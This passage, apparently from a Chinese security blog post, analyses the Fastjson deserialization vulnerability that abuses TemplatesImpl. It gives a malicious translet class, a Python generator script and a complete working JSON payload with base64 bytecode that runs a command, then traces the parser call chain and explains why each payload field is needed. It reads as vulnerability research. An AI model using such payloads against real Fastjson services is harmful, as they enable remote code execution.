            Runtime.getRuntime().exec("open -a Calculator");
        }
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
        @Override
        public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException {
        }
        public static void main(String[] args) throws Exception {
            TEMPOC t = new TEMPOC();
        }
    }
通过如下方式进行base64加密以及生成payload
    import base64
    fin = open(r"TEMPOC.class","rb")
    byte = fin.read()
    fout = base64.b64encode(byte).decode("utf-8")
    poc = '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["%s"],"_name":"a.b","_tfactory":{},"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}'% fout
    print poc
POC如下
    {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg=="],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
通过poc进行分析
调用链
首先先调用了在`JSON.java`中的`parseObject()`
    com.alibaba.fastjson.JSON#parse(java.lang.String, com.alibaba.fastjson.parser.Feature...)
    public static JSONObject parseObject(String text, Feature... features) {
            return (JSONObject) parse(text, features);
        }
就相当于把parseObject变成了`parse(text, features)`类，并传入参数
跳转到
    com.alibaba.fastjson.JSON#parse(java.lang.String, com.alibaba.fastjson.parser.Feature...)
    public static Object parse(String text, Feature... features) {
            int featureValues = DEFAULT_PARSER_FEATURE;
            for (Feature feature : features) {
                featureValues = Feature.config(featureValues, feature, true);
            }
            return parse(text, featureValues);
        }
再跳到parse(String text, int features)
在这里new了一个DefaultJSONParser对象
    DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
        public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config){
            this.lexer = lexer;
            this.input = input;
            this.config = config;
            this.symbolTable = config.symbolTable;
            int ch = lexer.getCurrent();
            if (ch == '{') {
                lexer.next();
                ((JSONLexerBase) lexer).token = JSONToken.LBRACE;
            } else if (ch == '[') {
                lexer.next();
                ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;
            } else {
                lexer.nextToken(); // prime the pump
            }
        }
在这个对象中，主要是进行了对于传入字符串的获取操作
然后再传入parser.parseObject()来解析传入的数据
在这个函数主体内，会完成对于JSON数据的解析处理。在for循环中，不断的取得JSON数据中的值，然后进入`scanSymbol`处理。在scanSymbol中，首先会遍历取出两个双引号之间的数据作为key。
然后到了下面这句进行反序列化
    com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)
    return deserializer.deserialze(this, clazz, fieldName);
传入的参数列表
跟进函数查看
    public  T deserialze(DefaultJSONParser parser, Type type, Object fieldName) {
            return deserialze(parser, type, fieldName, 0);
        }
        再到
    public  T deserialze(DefaultJSONParser parser, Type type, Object fieldName, int features) {
            return deserialze(parser, type, fieldName, null, features);
        }
        再到
    com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, java.lang.Object, int)
    boolean match = parseField(parser, key, object, type, fieldValues);
之后进入parseField()调用smartMatch()对key值进行处理
之后进入了fieldDeserializer.parseField()
在这里调用了setValue方法
`com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField`
跟进之后发现这个方法中通过反射使fieldinfo的method值为outputProperties
并在接下来的循环中通过invoke方法来调用class
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
跟进newTransformer方法
在这里主要看这个
    transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);
跟进getTransletInstance()方法
`_bytecodes`会传入getTransletInstance方法中的defineTransletClasses方法，defineTransletClasses方法会根据`_bytecodes`字节数组new一个`_class`，`_bytecodes`加载到`_class`中，最后根据`_class`,用newInstance生成一个java实例。
classloader是将class字节类载入虚拟机的一种形式，为了给外界提供一种加载class的途径
载入的内容
getConstructors()：此方法用于取得全部构造方法
newInstance()创建对象用的一个方法
所以这句话的意思是，将刚才载入的`_class[_transletIndex]`获取他的全部构造方法然后创建这个对象
最后一步，就是AbstractTranslet的强制转换
到这里命令就成功执行了
## 问题解答
###  为什么要继承AbstractTranslet
在这里有一个AbstractTranslet的强制转换所以需要继承，不然会报错
###  为什么只有在设定Feature.SupportNonPublicField参数才可以反序列化成功
这个问题其实也是为什么需要设定`_tfactory={}`是一样的
在defineTransletClasses()方法中需要满足`_tfactory`变量不为null，否则导致程序异常退出
因为`_tfactory`为私有变量，且无setter方法，所以需要指定Feature.SupportNonPublicField参数
就是为了支持私有属性的传入
###  为什么要base64编码并用数组格式
根据前面的内容 在反序列化deserialze之后调用了parseField()中
     value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);
跟进跳转
com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze
在这里主要是对格式进行判断
当判断`_bytecodes`为数组的格式时，进入parseArray方法
com.alibaba.fastjson.parser.DefaultJSONParser#parseArray(java.lang.reflect.Type,
java.util.Collection, java.lang.Object)
在这个函数时，
    val = deserializer.deserialze(this, type, i);
又调用了 com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze
这次已经是数组提取的结果，进入了循环
                if (lexer.token() == JSONToken.LITERAL_STRING) {
                byte[] bytes = lexer.bytesValue();
                lexer.nextToken(JSONToken.COMMA);
                return (T) bytes;
            }
跟进lexer.bytesValue()
位于com.alibaba.fastjson.parser.JSONScanner#bytesValue
就是一个base64解码的操作，所以我们传入的`__bytecode`需要是数组形式并base64编码
## 参考